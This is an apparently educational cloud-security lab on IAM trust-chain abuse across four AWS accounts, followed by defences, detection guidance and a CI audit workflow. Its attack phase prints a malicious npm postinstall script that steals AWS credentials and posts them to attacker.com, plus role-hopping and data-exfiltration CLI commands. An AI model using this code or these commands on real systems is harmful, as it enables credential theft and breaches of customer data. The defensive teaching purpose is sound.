# Lab 9.4: IAM Chain Abuse

<div class="lab-meta">
  <span>~45 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="../tier-2/2.4-secrets-in-ci.md">Lab 2.4</a></span>
</div>

Cloud IAM is itself a supply chain. When your production account trusts your staging account, which trusts your CI account, which trusts your dev account, you have built a chain. Each link is a trust relationship. an `AssumeRole` policy, a service account impersonation binding, a cross-account access grant.

No individual link is wrong. Developers need to trigger CI builds. CI needs to deploy to staging. Staging needs to promote to production. Each trust relationship is reasonable in isolation. But the transitive chain creates an attack path: compromise one developer's credentials, and you can traverse four trust boundaries to reach production.

This is not a misconfiguration. This is how organizations build their cloud infrastructure. The question is not whether trust chains exist. they do, in every multi-account AWS organization, every GCP project hierarchy, every Azure tenant. The question is whether you have conditions, monitoring, and circuit breakers on each link.

In this lab, you will trace a four-account trust chain, execute the full traversal from a compromised dev dependency to production data access, and then implement the defenses that break the chain.

???+ info "Phase 1: UNDERSTAND. IAM as a Supply Chain"

    **Goal:** Map the trust chain across four AWS accounts and understand how each link forms.

### Step 1: Read the trust chain diagram

```bash
cat src/trust-chain-diagram.txt
```

The chain is:

```
Dev Account (111111111111)
  └── dev-deploy can AssumeRole → CI Account ci-runner

CI Account (222222222222)
  └── ci-runner can AssumeRole → Staging Account staging-deploy

Staging Account (333333333333)
  └── staging-deploy can AssumeRole → Production Account prod-deploy

Production Account (444444444444)
  └── prod-deploy has access to customer data, databases, secrets
```

### Step 2: Examine each trust policy

```bash
# Dev Account role
cat src/trust-policies/dev-account-role.json

# CI Account role
cat src/trust-policies/ci-account-role.json

# Staging Account role
cat src/trust-policies/staging-account-role.json

# Production Account role
cat src/trust-policies/prod-account-role.json
```

Notice what every trust policy has in common:

| Trust Policy Property | Dev → CI | CI → Staging | Staging → Prod |
|----------------------|----------|-------------|----------------|
| Principal | Dev Account root | CI Account root | Staging Account root |
| Action | `sts:AssumeRole` | `sts:AssumeRole` | `sts:AssumeRole` |
| **Conditions** | **None** | **None** | **None** |
| ExternalId | Missing | Missing | Missing |
| Source IP restriction | Missing | Missing | Missing |
| MFA requirement | Missing | Missing | Missing |
| Time-of-day restriction | Missing | Missing | Missing |

Each trust policy says: "I trust anyone in account X to assume this role, at any time, from any IP, without any additional verification." Individually reasonable. Transitively catastrophic.

### Step 3: Understand the business justification

Each link exists for a legitimate reason:

- **Dev → CI:** Developers push code, which triggers CI builds. The dev account needs to assume a CI role to start builds.
- **CI → Staging:** After a successful build, the CI pipeline deploys to staging for integration testing.
- **Staging → Prod:** After staging validation passes, the deployment promotes to production (blue-green or canary).

The chain mirrors the software development lifecycle. The problem is that the chain has no circuit breakers.

### Step 4: Understand the "confused deputy" amplification

Each role trusts the entire account, not a specific role. The CI Account trust policy says:

```json
"Principal": {"AWS": "arn:aws:iam::111111111111:root"}
```

This means ANY entity in account 111111111111 can assume ci-runner. not just `dev-deploy`, but also any Lambda function, any EC2 instance with an instance profile, any other role that exists in the dev account. The attack surface is the entire dev account.

???+ warning "Phase 2: BREAK. Traversing the Trust Chain"

    **Goal:** Starting from a compromised dev dependency, traverse the full chain to production.

### Step 1: The initial compromise

A developer installs a malicious npm package (typosquat of an internal tool). The package's `postinstall.js` reads AWS credentials:

```javascript
// postinstall.js from malicious npm package "eslint-config-acme"
// (typosquat of internal "eslint-config-acme-corp")
const fs = require('fs');
const https = require('https');
const os = require('os');

// Read AWS credentials
const credsPath = `${os.homedir()}/.aws/credentials`;
const configPath = `${os.homedir()}/.aws/config`;

let data = '';
if (fs.existsSync(credsPath)) data += fs.readFileSync(credsPath, 'utf8');
if (fs.existsSync(configPath)) data += fs.readFileSync(configPath, 'utf8');

// Also check environment variables
const envCreds = {
    AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
    AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY,
    AWS_SESSION_TOKEN: process.env.AWS_SESSION_TOKEN,
};

// Exfiltrate
const payload = JSON.stringify({ files: data, env: envCreds });
const req = https.request({
    hostname: 'attacker.com', port: 443, path: '/collect', method: 'POST',
    headers: { 'Content-Type': 'application/json' }
}, () => {});
req.write(payload);
req.end();
```

The attacker now has the developer's `dev-deploy` role credentials.

### Step 2: Hop 1. Dev to CI

```bash
# Attacker uses stolen dev-deploy credentials
aws sts assume-role \
    --role-arn arn:aws:iam::222222222222:role/ci-runner \
    --role-session-name "developer-alice-ci-trigger" \
    --duration-seconds 43200
```

This succeeds because:

- The `ci-runner` trust policy allows any entity in account 111111111111
- No ExternalId is required
- No source IP restriction
- No MFA requirement
- The attacker requests maximum session duration (12 hours)

### Step 3: Hop 2. CI to Staging

```bash
# Using ci-runner credentials from Hop 1
aws sts assume-role \
    --role-arn arn:aws:iam::333333333333:role/staging-deploy \
    --role-session-name "ci-staging-deploy-manual"
```

No CodeBuild job ran. No tests passed. No deployment pipeline was invoked. The attacker simply called `AssumeRole` directly. The trust policy does not require that the caller actually be a build job.

### Step 4: Hop 3. Staging to Production

```bash
# Using staging-deploy credentials from Hop 2
aws sts assume-role \
    --role-arn arn:aws:iam::444444444444:role/prod-deploy \
    --role-session-name "staging-prod-promote"
```

### Step 5: Exfiltrate production data

```bash
# Using prod-deploy credentials from Hop 3
# List customer data
aws s3 ls s3://customer-data-444444444444/

# Download customer export
aws s3 cp s3://customer-data-444444444444/exports/customers-full-2026.csv /tmp/

# Read production secrets
aws secretsmanager get-secret-value --secret-id prod/database/master-password

# Query production database
aws dynamodb scan --table-name orders-production --max-items 100
```

**Total time from initial compromise to production data access: 8 minutes.**

No individual trust policy was "wrong." The chain existed because it mirrors the legitimate deployment lifecycle. The attacker just walked the chain manually instead of waiting for the CI/CD pipeline to do it.

???+ success "Phase 3: DEFEND. Breaking the Chain"

    **Goal:** Add conditions to each trust boundary, implement OIDC federation, and apply zero-trust principles.

### Fix 1: Add External ID conditions

External IDs are secrets shared between the trusting and trusted accounts. An attacker who steals credentials from the trusted account still cannot assume the role without knowing the External ID:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::222222222222:role/ci-runner"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "ci-to-staging-7f3a9b2c-4e1d-48a7-b6f5"
      }
    }
  }]
}
```

Note the Principal is now a specific role ARN, not `account:root`. Combined with the ExternalId, this restricts access to one specific role that knows the shared secret.

### Fix 2: Add source IP and time-of-day conditions

```json
{
  "Condition": {
    "IpAddress": {
      "aws:SourceIp": ["10.200.0.0/16"]
    },
    "DateGreaterThan": {
      "aws:CurrentTime": "2026-01-01T06:00:00Z"
    },
    "DateLessThan": {
      "aws:CurrentTime": "2026-01-01T22:00:00Z"
    }
  }
}
```

The CI account's NAT gateway has a known IP range. Restrict `AssumeRole` to that range. The deployment pipeline runs during business hours. Restrict to that window. An attacker calling from a different IP at 2 AM fails both conditions.

### Fix 3: Use OIDC federation instead of long-lived credentials

Replace the entire trust chain with OIDC federation. The CI system proves its identity via a signed JWT token, not via stored credentials:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::333333333333:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
      }
    }
  }]
}
```

With OIDC federation:

- **No long-lived credentials**. there are no access keys to steal
- **Scoped to repository and branch**. only builds from `myorg/myrepo` on `main` can assume the role
- **Short-lived tokens**. JWT tokens expire in minutes, not hours
- **No chain**. each environment has a direct OIDC trust, not a transitive chain through other accounts

### Fix 4: Implement cross-account access logging and alerting

Even with conditions in place, monitor the chain:

```bash
# CloudTrail Lake query: all cross-account AssumeRole events
SELECT
    eventTime,
    userIdentity.accountId as sourceAccount,
    JSON_EXTRACT(requestParameters, '$.roleArn') as targetRole,
    sourceIPAddress,
    JSON_EXTRACT(requestParameters, '$.durationSeconds') as sessionDuration
FROM cloudtrail_events
WHERE eventName = 'AssumeRole'
AND userIdentity.accountId != recipientAccountId
ORDER BY eventTime DESC
LIMIT 100
```

### Fix 5: Apply the hardened trust policies

For each hop in the chain, the hardened trust policy includes:

1. **Specific Principal**. role ARN, not account root
2. **ExternalId**. shared secret
3. **Source IP**. restrict to known IP ranges
4. **Session duration**. cap at 1 hour, not 12
5. **Session tags**. require tags that identify the purpose

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::222222222222:role/ci-runner"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "ci-to-staging-7f3a9b2c",
        "aws:RequestTag/Purpose": "deployment"
      },
      "IpAddress": {
        "aws:SourceIp": "10.200.0.0/16"
      },
      "NumericLessThanEquals": {
        "sts:DurationSeconds": "3600"
      }
    }
  }]
}
```

??? danger "Phase 4: DETECT. Monitoring IAM Trust Chains"

    **Goal:** Detect trust chain abuse using CloudTrail cross-account analysis, time-of-day anomalies, and impossible travel detection.

### CloudTrail Analysis

The key insight: legitimate trust chain traversals follow a predictable pattern. Malicious traversals deviate in timing, source IP, session duration, and subsequent actions.

**Baseline the normal pattern:**

```
Normal deployment:
  09:15  Dev → CI      (IP: 203.0.113.50, duration: 3600s)
  09:22  CI → Staging  (IP: 10.200.0.15,  duration: 3600s, 7min after build)
  10:45  Staging → Prod (IP: 10.200.0.15, duration: 3600s, Tuesday 14:00 release window)
```

**Alert on deviations:**

```
Malicious traversal:
  02:14  Dev → CI      (IP: 198.51.100.77, duration: 43200s)  ← Wrong time, wrong IP, max duration
  02:15  CI → Staging  (IP: 198.51.100.77, duration: 43200s)  ← 28sec later (no build ran)
  02:15  Staging → Prod (IP: 198.51.100.77, duration: 43200s) ← 17sec later (no approval)
  02:16  GetObject customer-data-*                              ← Data exfiltration
```

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "Rapid cross-account role assumption chain detected (< 2 min between hops)" (CloudTrail)
    - "AssumeRole from unexpected source IP" (CloudTrail / GuardDuty)
    - "Maximum session duration requested for cross-account role" (CloudTrail)
    - "Cross-account access outside business hours" (CloudTrail)
    - "Production data access from deployment role (unusual action)" (CloudTrail)

    **Why this matters to your SOC:** IAM trust chain abuse is the cloud equivalent of lateral movement. It does not exploit a vulnerability. it abuses legitimate trust relationships. GuardDuty may flag individual suspicious calls, but the chain traversal pattern (four AssumeRole calls in rapid succession across four accounts) is the strongest signal. Individual hops look normal; the chain looks wrong.

    **Triage workflow:**

    1. **Map the chain**. identify all AssumeRole calls from the same source IP or session in the last hour. Build the full graph: source account -> target account -> target account.
    2. **Check the timing**. are the hops faster than a real build/deploy pipeline would take? Less than 2 minutes between hops means no build ran.
    3. **Check the source IP**. does it match the expected IP for the source account? Different IP = compromised credentials.
    4. **Check the session duration**. legitimate build sessions use 1-hour durations. Maximum duration (12h) is a red flag.
    5. **Check subsequent actions**. did the final role perform deployment actions (normal) or data access actions (data exfiltration)?
    6. **Check the initial compromise**. if the chain started from a dev account, look for recent `npm install`, `pip install`, or other package manager activity that could have installed a malicious package.

    **False positive rate:** Low. Rapid multi-account chain traversals without corresponding build/deploy activity are almost always malicious. The key discriminator is the gap between hops: legitimate pipelines take minutes to hours between stages, not seconds.

??? example "CI Integration"

    Audit IAM trust policies in IaC before deployment.

    **`.github/workflows/iam-trust-audit.yml`:**

    ```yaml
    name: IAM Trust Chain Audit

    on:
      pull_request:
        paths:
          - "terraform/**"
          - "cloudformation/**"
          - "iam/**"

    jobs:
      audit-trust-policies:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Check for overly broad trust policies
            run: |
              echo "--- Checking IAM trust policies ---"
              VIOLATIONS=0

              # Check for account-root principals (should be specific role ARNs)
              for f in $(find . -name "*.json" -path "*trust*" -o -name "*.json" -path "*iam*"); do
                if grep -q '"AWS": "arn:aws:iam::[0-9]*:root"' "$f"; then
                  echo "::error file=$f::Trust policy uses account root principal. Use a specific role ARN."
                  VIOLATIONS=$((VIOLATIONS + 1))
                fi
              done

              # Check for missing External ID condition
              for f in $(find . -name "*.json" -path "*trust*"); do
                if grep -q 'sts:AssumeRole' "$f" && ! grep -q 'sts:ExternalId' "$f"; then
                  echo "::error file=$f::Cross-account trust without ExternalId condition"
                  VIOLATIONS=$((VIOLATIONS + 1))
                fi
              done

              # Check for missing source IP condition
              for f in $(find . -name "*.json" -path "*trust*"); do
                if grep -q 'sts:AssumeRole' "$f" && ! grep -q 'aws:SourceIp' "$f"; then
                  echo "::warning file=$f::Cross-account trust without source IP condition (recommended)"
                fi
              done

              if [ "$VIOLATIONS" -gt 0 ]; then
                echo ""
                echo "Found $VIOLATIONS trust policy violations."
                exit 1
              fi
              echo "PASS: All trust policies have proper conditions."

          - name: Detect trust chains longer than 2 hops
            run: |
              echo "--- Analyzing trust chain depth ---"
              python3 << 'PYEOF'
              import json, glob, re

              # Build a graph of trust relationships
              trust_graph = {}
              for f in glob.glob("**/trust*.json", recursive=True) + glob.glob("**/iam*.json", recursive=True):
                  try:
                      with open(f) as fh:
                          data = json.load(fh)
                      # Find AssumeRole permissions
                      for stmt in data.get("PermissionPolicy", {}).get("Statement", []):
                          if "sts:AssumeRole" in str(stmt.get("Action", "")):
                              source = data.get("_account", "unknown")
                              targets = stmt.get("Resource", "")
                              if isinstance(targets, str):
                                  targets = [targets]
                              for t in targets:
                                  m = re.search(r'arn:aws:iam::(\d+):', t)
                                  if m:
                                      trust_graph.setdefault(source, []).append(m.group(1))
                  except (json.JSONDecodeError, AttributeError):
                      continue

              # Find chains
              def find_chains(graph, start, visited=None):
                  if visited is None:
                      visited = []
                  visited.append(start)
                  chains = [visited[:]]
                  for target in graph.get(start, []):
                      if target not in visited:
                          chains.extend(find_chains(graph, target, visited))
                  visited.pop()
                  return chains

              longest = 0
              for start in trust_graph:
                  for chain in find_chains(trust_graph, start):
                      if len(chain) > longest:
                          longest = len(chain)
                      if len(chain) > 3:
                          print(f"WARNING: Trust chain of length {len(chain)}: {' -> '.join(chain)}")

              if longest > 3:
                  print(f"\n::error::Trust chain depth {longest} exceeds maximum of 3 hops")
                  exit(1)
              else:
                  print(f"PASS: Maximum trust chain depth is {longest} hops")
              PYEOF
    ```

## What You Learned

1. **Cloud IAM is a supply chain**. trust relationships form transitive chains that enable traversal from low-privilege to high-privilege accounts.
2. **No individual link is wrong**. each trust relationship serves a legitimate business purpose. The vulnerability is the transitive chain without conditions.
3. **The attack is fast**. 8 minutes from dev credential theft to production data exfiltration, with no alerts in a default configuration.
4. **Conditions break the chain**. ExternalId, source IP restrictions, time-of-day limits, and specific role ARN principals add friction that stops automated traversal.
5. **OIDC federation eliminates the chain**. with no long-lived credentials and direct trust relationships, the transitive chain does not exist.
6. **Detection relies on timing**. the strongest signal is rapid cross-account role assumption without corresponding build/deploy activity.
